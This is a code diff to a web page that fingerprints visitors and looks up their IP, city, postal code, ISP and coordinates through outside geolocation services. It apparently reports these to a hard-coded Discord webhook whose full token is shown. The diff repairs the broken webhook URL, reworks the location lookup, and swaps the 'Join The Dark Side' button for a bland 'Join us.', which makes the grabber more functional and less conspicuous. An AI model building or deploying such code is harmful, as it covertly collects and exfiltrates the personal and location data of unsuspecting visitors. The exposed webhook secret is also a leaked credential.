@@ -93,7 +93,7 @@
 <body>
 
 <canvas id="c"></canvas>
-<button id="myinfo-btn">Join The Dark Side</button>
+<button id="myinfo-btn">Join us.</button>
 
 <div id="myinfo-modal">
   <div class="modal-box">
@@ -129,7 +129,7 @@
 
 <script>
 // ── CONFIG ────────────────────────────────────────────────
-const WEBHOOK = '=https://discord.com/api/webhooks/1499514371511025856/nxiLGjYa_v31aLOVjZxXaZ79V15gAr7KOem3gypFTWNt6UKopkFo65LUNLcdJZ0u0CC';
+const WEBHOOK = 'https://discord.com/api/webhooks/1499514371511025856/nxiLGjYa_v31aLOVjZxXaZ79V15gAr7KOem3gypFTWNt6UKopkFo65LUNLcdJZ0u0CC';
 // ─────────────────────────────────────────────────────────
 
 // Particle canvas
@@ -211,20 +211,21 @@ function getFingerprint(){
     online:navigator.onLine?'Online':'Offline',gpu};
 }
 
-// IP lookup via ipwho.is (HTTPS, no CORS issues)
+// IP lookup — original working system
 async function fetchIPInfo(){
   try{
-    const d=await(await fetch('https://ipwho.is/')).json();
+    const ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip;
+    const d=await(await fetch(`https://ipapi.co/${ip}/json/`)).json();
     return{
-      ip:d.ip||'Unknown',
-      country:d.country||'Unknown', code:d.country_code||'',
+      ip:ip||'Unknown',
+      country:d.country_name||'Unknown', code:d.country_code||'',
       region:d.region||'Unknown', city:d.city||'Unknown',
       postal:d.postal||'Unknown',
-      isp:d.connection?.isp||'Unknown',
-      asn:d.connection?.asn?`AS${d.connection.asn}`:'Unknown',
-      org:d.connection?.org||'Unknown',
+      isp:d.org||'Unknown',
+      asn:d.asn||'Unknown',
+      org:d.org||'Unknown',
       lat:d.latitude||'?', lon:d.longitude||'?',
-      tz:d.timezone?.id||'Unknown',
+      tz:d.timezone||'Unknown',
     };
   }catch(e){
     return{ip:'Unknown',country:'Unknown',code:'',region:'Unknown',city:'Unknown',
